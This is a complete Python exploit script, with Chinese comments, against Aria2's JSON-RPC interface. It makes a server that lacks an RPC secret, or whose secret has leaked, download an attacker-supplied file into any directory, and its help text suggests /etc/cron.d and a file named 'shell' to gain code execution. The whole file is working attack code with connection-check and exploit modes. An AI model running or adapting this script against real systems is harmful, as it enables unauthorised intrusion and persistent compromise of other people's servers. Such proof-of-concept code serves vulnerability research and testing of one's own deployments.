#!/usr/bin/env python3
"""
Aria2 任意文件写入漏洞 POC
利用 Aria2 的 RPC 接口 (默认 6800 端口) 无认证或弱认证，通过 addUri 下载文件到任意目录。
影响范围: Aria2 未设置 rpc-secret 或密钥泄漏时，且以 root 运行可写系统目录。
"""

import argparse
import requests
import sys
import json

class Aria2RCE:
    def __init__(self, rpc_url, secret=None, timeout=10):
        self.url = rpc_url.rstrip('/')
        self.secret = secret
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({"Content-Type": "application/json"})

    def _log(self, msg): print(f"[*] {msg}")
    def _success(self, msg): print(f"[+] {msg}")
    def _error(self, msg): print(f"[-] {msg}")

    def _build_token(self):
        """构造 token 前缀"""
        return f"token:{self.secret}" if self.secret else None

    def _call(self, method, params=None):
        """
        调用 Aria2 JSON-RPC 方法。
        params 应为列表（不含 token），token 会被自动处理。
        """
        token = self._build_token()
        if token:
            # 将 token 插入 params 的最前面
            if params is None:
                params = [token]
            else:
                params = [token] + params
        else:
            params = params or []

        payload = {
            "jsonrpc": "2.0",
            "id": "1",
            "method": method,
            "params": params
        }
        try:
            resp = self.session.post(self.url, json=payload, timeout=self.timeout)
            if resp.status_code == 200:
                data = resp.json()
                if "error" in data:
                    self._error(f"RPC 错误: {data['error']}")
                    return None
                return data.get("result")
            else:
                self._error(f"HTTP {resp.status_code}: {resp.text[:200]}")
                return None
        except requests.RequestException as e:
            self._error(f"连接失败: {e}")
            return None

    def check_connection(self):
        """检测 Aria2 服务是否可达且有权限"""
        self._log("检测 Aria2 连接...")
        result = self._call("aria2.getVersion")
        if result:
            self._success(f"连接成功，Aria2 版本: {result.get('version', 'unknown')}")
            return True
        return False

    def add_download(self, urls, dir_path, file_name):
        """
        创建下载任务，将文件写入指定路径。
        :param urls: 文件下载链接列表（至少一个）
        :param dir_path: 目标目录
        :param file_name: 文件名
        """
        options = {
            "dir": dir_path,
            "out": file_name
        }
        # 参数顺序: [urls, options] (已去掉 position)
        result = self._call("aria2.addUri", [[urls], options])
        if result:
            self._success(f"下载任务创建成功，GID: {result}")
            return result
        else:
            self._error("添加下载任务失败，可能权限不足或路径不可写。")
            return None

    def exploit(self, download_url, target_dir, file_name):
        if not self.check_connection():
            return False
        # 尝试写入文件
        return self.add_download(download_url, target_dir, file_name) is not None

def main():
    parser = argparse.ArgumentParser(description="Aria2 任意文件写入漏洞 POC")
    parser.add_argument("-t", "--target", required=True,
                        help="Aria2 JSON-RPC 地址，如 http://192.168.1.1:6800/jsonrpc")
    parser.add_argument("-u", "--url", required=True, help="恶意文件的下载 URL")
    parser.add_argument("-d", "--dir", required=True, help="目标写入目录，如 /etc/cron.d")
    parser.add_argument("-f", "--filename", required=True, help="保存的文件名，如 shell")
    parser.add_argument("-s", "--secret", help="RPC 密钥（若设置）")
    parser.add_argument("--check", action="store_true", help="仅检测连接不执行写入")
    args = parser.parse_args()

    poc = Aria2RCE(rpc_url=args.target, secret=args.secret)

    try:
        if args.check:
            if poc.check_connection():
                print("[+] 服务可用，可能存在任意文件写入风险。")
            sys.exit(0)
        else:
            if poc.exploit(args.url, args.dir, args.filename):
                print("[+] 漏洞利用成功，恶意文件已写入。")
                sys.exit(0)
            else:
                sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
        sys.exit(1)

if __name__ == "__main__":
    main()